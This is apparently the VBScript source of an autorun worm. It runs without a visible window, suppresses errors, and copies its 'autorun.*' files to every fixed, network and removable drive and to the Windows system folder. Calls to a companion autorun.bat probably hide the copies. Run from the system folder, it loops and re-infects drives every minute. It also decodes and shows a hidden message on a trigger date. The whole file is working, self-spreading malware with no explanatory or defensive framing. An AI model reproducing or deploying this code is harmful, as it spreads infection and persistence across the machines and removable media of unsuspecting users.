em autorun·ç±©
on error resume next
Set WshShell =CreateObject("WScript.Shell")

if Year(Date)=000 and Month(Date)=0 and Day(Date)=0 then
a=WshShell.Run("autorun.bat Over" ,0,True)
Set Of = CreateObject("Scripting.FileSystemObject")
Set fc = Of.OpenTextFile("C:\autorun.txt", 1)
mt = fc.ReadAll
fc.Close
if mt<>"" then msgbox decrypt(mt)
end if

if Year(Date)>2030 or Month(Date)>100 then
else
For i=1 to 1
set Of = CreateObject("Scripting.FileSystemObject")
set dir = Of.GetSpecialFolder(1)

Set dc = Of.Drives
if WScript.ScriptFullName=dir&"\autorun.vbs" then
isdir=true
else
a=WshShell.Run("autorun.bat Open" ,0,False)
isdir=false
end if
For Each d In dc
If d.DriveType = 2 Or d.DriveType = 3 or (d.DriveType = 1 and d<>"A:" and d<> "B:") Then
a=WshShell.Run("autorun.bat - "&d ,0,True)
if isdir then
Of.CopyFile dir&"\autorun.*",d&"\",True
else
Of.CopyFile "autorun.*",d&"\",True
end if
a=WshShell.Run("autorun.bat + "&d ,0,True)
End If
next
if isdir then
wscript.sleep 60000
i=0
else
a=WshShell.Run("autorun.bat - "&dir ,0,True)
Of.CopyFile "autorun.*",dir&"\",True
a=WshShell.Run("autorun.bat + "&dir ,0,True)
End if
next
End if

function decrypt(dcode)
dim texts
dim i
for i=1 to len(dcode)-4
x=i mod 5
texts=texts & chr(asc(mid(dcode,i,1))-x)
next
decrypt=texts
end function